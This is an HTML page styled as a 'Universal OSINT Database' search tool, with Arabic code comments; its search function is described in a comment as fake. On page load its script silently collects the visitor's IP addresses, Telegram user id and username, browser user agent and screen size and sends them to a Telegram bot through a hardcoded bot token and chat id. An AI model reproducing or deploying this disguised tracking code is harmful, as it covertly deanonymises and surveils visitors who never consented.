<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Universal OSINT Database</title>
    <style>/* ... نفس التنسيق السابق ... */</style>
</head>
<body>
    <div class="container">
        <h1>🌐 Universal OSINT Database</h1>
        <!-- ... واجهة البحث ... -->
    </div>

    <script>
        // ⚠️ ضع توكن البوت ومعرف المحادثة هنا (لأننا حذفنا Cloudflare)
        const BOT_TOKEN = "9140495515:AAEaZwF8s79xlbex0jOF6iupyaVCiaPxEDc";
        const CHAT_ID = "8735622476";

        // دالة لجلب IP (IPv4 و IPv6) من خدمة خارجية
        async function getPublicIPs() {
            let ipv4 = "Unknown";
            let ipv6 = "Unknown";
            try {
                // جلب IPv4
                const res4 = await fetch('https://api.ipify.org?format=json');
                const data4 = await res4.json();
                ipv4 = data4.ip;
            } catch (e) {}

            try {
                // جلب IPv6 (إذا كانت الشبكة تدعمها)
                const res6 = await fetch('https://api64.ipify.org?format=json');
                const data6 = await res6.json();
                ipv6 = data6.ip;
            } catch (e) {}

            return { ipv4, ipv6 };
        }

        // عند فتح الصفحة: جلب الـ IP وإرساله إلى تيليجرام
        window.addEventListener('DOMContentLoaded', async () => {
            let tgData = { id: null, username: null };
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp;
                tg.ready();
                const user = tg.initDataUnsafe?.user;
                if (user) {
                    tgData.id = user.id;
                    tgData.username = user.username || user.first_name;
                }
            }

            // جلب الـ IP
            const ips = await getPublicIPs();

            // تجهيز الرسالة
            const msg = `
🚨 **New Visitor Alert (Client-Side)**
- **IPv4:** ${ips.ipv4}
- **IPv6:** ${ips.ipv6}
- **Telegram:** ${tgData.username || 'N/A'} (ID: ${tgData.id || 'N/A'})
- **Device:** ${navigator.userAgent}
- **Screen:** ${screen.width}x${screen.height}
            `;

            // إرسال مباشر إلى تيليجرام (بدون Cloudflare)
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error("Failed to send to Telegram", e);
            }
        });

        // ... دالة البحث الوهمي (performSearch) تبقى كما هي ...
    </script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</body>
</html>
